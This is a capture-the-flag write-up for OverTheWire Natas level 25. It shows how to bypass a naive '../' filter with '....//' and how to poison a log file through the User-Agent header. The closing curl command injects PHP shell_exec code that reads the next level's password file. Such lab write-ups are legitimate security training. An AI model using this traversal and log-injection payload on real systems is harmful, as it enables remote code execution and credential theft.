# This is a writeup for Natas - level 25

This site features text that is displayed in English or German.

Setting the language through the GUI shows you in the url bar that the language is set with a GET parameter called lang.
Looking at the sourcecode tells us that the file is found at language/<lang>

Immediately we think of path traversals. But alas, looking at the sourcecode at the function ```php safeinclude``` tells us that any '../' will be replaced by ''

```php
 if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
            }
```

But if we write '....//', we will be left with '../' as desired!

Now we just pass in something like http://natas25.natas.labs.overthewire.org/?lang=....//....//....//....//....//etc/natas_webpass/natas26 and we are done, right?

Not quite. The next part of the ```php safeinclude``` function states that 'natas_webpass' is forbidden:

```php
if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
```

So it was a red herring...

Now, my take-away from solving this level is that I should always look for places where I can inject data. I obviously do that with $_REQUEST (in particular the ["lang"] key is used) but also in the $_SERVER['HTTP_USER_AGENT']. Let's look at that code:

```php
function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
```

The user agent is appended to the log file, and that is exploitable.

I send a curl request with a specific user agent to inject php code into the server.

<details>
  <summary>
    Click to reveal the command
  </summary>

  curl -H "User-Agent: <? echo shell_exec('cat /etc/natas_webpass/natas26')?>" -u "natas25:<pwd>" -b "PHPSESSID=mysession" http://natas25.natas.labs.overthewire.org/?lang=....//logs/natas25_mysession.log

</details>

For reference, I used [this write-up](https://learnhacking.io/overthewire-natas-level-25-walkthrough/) to solve the level; in particular the $_SERVER['HTTP_USER_AGENT'] exploit.
